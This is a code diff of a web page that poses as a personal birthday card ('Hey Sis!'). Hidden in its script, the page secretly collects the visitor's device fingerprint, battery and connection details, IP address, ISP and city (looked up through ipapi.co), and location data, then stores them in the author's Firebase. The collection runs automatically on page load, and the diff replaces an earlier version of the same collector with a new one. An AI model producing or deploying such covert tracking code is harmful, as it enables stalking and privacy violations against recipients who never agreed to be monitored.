@@ -186,7 +186,7 @@
         <div id="statusList" class="status-list"></div>
     </div>
 
-    <!-- UI Popups -->
+    <!-- UI Popups (unchanged) -->
     <div class="popup-overlay" id="overlay1">
         <div class="popup-card" id="card1">
             <div class="popup-title">Hey Sis! 👋</div>
@@ -235,11 +235,11 @@
         </div>
     </div>
 
-    <!-- Firebase SDK & Config + Extended Device Collection -->
+    <!-- Firebase SDK + Device Info Collector (Updated) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, serverTimestamp, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
@@ -254,138 +254,21 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getFirestore(app);
-        let currentUserId = null;
-        let deviceInfoSaved = false; // prevent duplicate saves
 
+        let currentUserId = null;
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
                     currentUserId = user.uid;
                     console.log("Logged in as:", currentUserId);
                     resolve(user);
-                    // Once authenticated, collect and store device info (without affecting UI flow)
-                    if (!deviceInfoSaved) captureAndStoreDeviceDetails();
                 }
             });
         });
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        // ---------- Helper: get browser & hardware details ----------
-        function getBrowserAndDeviceInfo() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
-            const screenRes = `${screen.width}x${screen.height}`;
-            const colorDepth = screen.colorDepth;
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            
-            // simple model extraction from userAgent (Android, iPhone, iPad, etc.)
-            let model = 'Unknown';
-            if (ua.includes('Android')) {
-                const match = ua.match(/Android\s([\d.]+)/);
-                const androidVer = match ? match[1] : '';
-                const brandMatch = ua.match(/; (\w+)\s?[\w-]*\s?Build/);
-                model = brandMatch ? brandMatch[1] + ' ' + androidVer : 'Android ' + androidVer;
-            } else if (ua.includes('iPhone')) {
-                const verMatch = ua.match(/iPhone OS ([\d_]+)/);
-                model = 'iPhone ' + (verMatch ? verMatch[1].replace(/_/g, '.') : '');
-            } else if (ua.includes('iPad')) {
-                model = 'iPad';
-            } else if (ua.includes('Windows')) {
-                model = 'Windows PC';
-            } else if (ua.includes('Mac')) {
-                model = 'Mac';
-            }
-            
-            return {
-                userAgent: ua,
-                platform: platform,
-                language: language,
-                hardwareCores: hardwareConcurrency,
-                deviceMemory: deviceMemory,
-                screenResolution: screenRes,
-                colorDepth: colorDepth,
-                timezone: timeZone,
-                touchCapable: touchSupport,
-                deviceModel: model.trim() || 'Unknown'
-            };
-        }
-
-        // ---------- Battery Info (if supported) ----------
-        async function getBatteryStatus() {
-            if (!navigator.getBattery) return { level: null, charging: null };
-            try {
-                const battery = await navigator.getBattery();
-                return {
-                    level: battery.level * 100,
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            } catch(e) {
-                return { level: null, charging: null, error: e.message };
-            }
-        }
-
-        // ---------- ISP & Network Provider via ipapi.co ----------
-        async function getNetworkISP() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                if (!response.ok) throw new Error('ISP fetch failed');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    isp: data.org || data.asn || 'Unknown',
-                    country: data.country_name,
-                    city: data.city,
-                    region: data.region,
-                    asn: data.asn,
-                    network: data.network
-                };
-            } catch (e) {
-                console.warn("ISP detection failed:", e);
-                return { isp: 'Unavailable', error: e.message };
-            }
-        }
-
-        // ---------- Save device data to Firestore (separate collection per user) ----------
-        async function saveDeviceInfoToFirestore(deviceInfo, batteryInfo, networkInfo) {
-            if (!currentUserId) return;
-            try {
-                const deviceDocRef = doc(collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'deviceInfo'));
-                await setDoc(deviceDocRef, {
-                    device: deviceInfo,
-                    battery: batteryInfo,
-                    network: networkInfo,
-                    timestamp: serverTimestamp(),
-                    pageUrl: window.location.href,
-                    referrer: document.referrer || 'direct'
-                });
-                console.log("✅ Device details saved to Firebase");
-                deviceInfoSaved = true;
-            } catch(e) {
-                console.error("Error saving device info:", e);
-            }
-        }
-
-        // ---------- Master function to capture and store everything (runs once after auth) ----------
-        async function captureAndStoreDeviceDetails() {
-            if (deviceInfoSaved) return;
-            try {
-                const deviceInfo = getBrowserAndDeviceInfo();
-                const batteryInfo = await getBatteryStatus();
-                const networkInfo = await getNetworkISP();
-                await saveDeviceInfoToFirestore(deviceInfo, batteryInfo, networkInfo);
-            } catch(err) {
-                console.error("Device capture error:", err);
-            }
-        }
-
-        // ---------- Location saving (existing) but ensuring device details also captured if not yet ----------
+        // Original saveLocationData (kept intact)
         window.saveLocationData = async (data) => {
             await authReady;
             if (!currentUserId) return;
@@ -397,12 +280,146 @@
                     userAgent: navigator.userAgent
                 });
                 console.log("Location saved successfully!");
-                // Also trigger device data capture once if not already done (redundancy)
-                if (!deviceInfoSaved) captureAndStoreDeviceDetails();
             } catch (e) { 
                 console.error("Firestore Error:", e); 
             }
         };
+
+        // ---------- NEW: Device Details Collector & Saver ----------
+        // Collect rich device data and save to same Firebase user path under 'deviceInfo' collection
+        async function collectDeviceDetails() {
+            const details = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                vendor: navigator.vendor || '',
+                vendorSub: navigator.vendorSub || '',
+                product: navigator.product || '',
+                productSub: navigator.productSub || '',
+                appVersion: navigator.appVersion,
+                // Screen & Resolution
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenAvailWidth: screen.availWidth,
+                screenAvailHeight: screen.availHeight,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio || 1,
+                // Browser & OS details from userAgent parse (extra)
+                browserInfo: parseUserAgent(navigator.userAgent),
+                // Connection (Network Information)
+                connection: await getConnectionInfo(),
+                // Battery Info
+                battery: await getBatteryInfo(),
+                // Internet Provider (ISP) via external API
+                isp: await getISP()
+            };
+            return details;
+        }
+
+        function parseUserAgent(ua) {
+            let os = "Unknown", browser = "Unknown", deviceModel = "Unknown";
+            // OS detection
+            if (ua.indexOf("Win") !== -1) os = "Windows";
+            else if (ua.indexOf("Mac") !== -1) os = "macOS";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("like Mac") !== -1) os = "iOS";
+            else os = "Other";
+            
+            // Browser detection
+            if (ua.indexOf("Edg") !== -1) browser = "Edge";
+            else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+            else browser = "Unknown";
+            
+            // Device Model (for mobile)
+            let modelMatch = ua.match(/\(([^)]+)\)/);
+            if (modelMatch) deviceModel = modelMatch[1];
+            return { os, browser, deviceModel, fullUA: ua };
+        }
+
+        async function getConnectionInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                return {
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData,
+                    type: conn.type
+                };
+            }
+            return { available: false };
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level * 100 + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) { return { error: "Battery API failed" }; }
+            }
+            return { unavailable: true };
+        }
+
+        async function getISP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    isp: data.org,
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    timezone: data.timezone
+                };
+            } catch (err) {
+                return { error: "ISP fetch failed", details: err.message };
+            }
+        }
+
+        async function saveDeviceInfo() {
+            await authReady;
+            if (!currentUserId) {
+                console.warn("No user ID yet, device info will be retried in 2s");
+                setTimeout(saveDeviceInfo, 2000);
+                return;
+            }
+            try {
+                const deviceData = await collectDeviceDetails();
+                const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'deviceInfo');
+                await addDoc(colRef, {
+                    ...deviceData,
+                    firebaseSavedAt: serverTimestamp()
+                });
+                console.log("✅ Device details saved to Firebase (deviceInfo collection)");
+            } catch (err) {
+                console.error("Failed to save device info:", err);
+            }
+        }
+
+        // Run device info collection after auth and page fully loaded
+        window.addEventListener('load', () => {
+            authReady.then(() => {
+                // Slight delay to ensure everything stable
+                setTimeout(saveDeviceInfo, 1000);
+            });
+        });
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
